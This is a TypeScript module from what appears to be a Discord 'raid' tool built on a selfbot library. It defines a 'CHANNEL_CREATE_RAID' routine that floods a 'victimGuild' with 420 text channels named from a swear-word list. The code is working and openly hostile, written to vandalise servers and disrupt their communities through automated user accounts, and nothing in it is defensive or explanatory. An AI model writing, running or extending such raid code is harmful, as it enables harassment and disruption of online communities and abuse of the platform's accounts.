import { Guild } from 'discord.js-selfbot-v13'
import { Raid } from './../typings/index.js'
import { Log, randomFrom, spinner } from './../utils/index.js'
import swearWords from '../assets/swearWords.js'
import chalk from 'chalk'

const channelCreateRaid: Raid = {
	name: 'CHANNEL_CREATE_RAID',
	id: 4,
	permission: 'MANAGE_CHANNELS',
	async execute(victimGuild: Guild) {
		const _spinner = spinner('Spam-creating channels').start()

		for (let i = 0; i < 420; i++) {
			await victimGuild.channels.create(randomFrom(swearWords), {
				type: 'GUILD_TEXT',
			})
			_spinner.text = `Spam-creating channels - [${i}]`
		}

		_spinner.stop()
		Log.success(`Created ${chalk.bold('420')} channels`)
	},
}

export default channelCreateRaid
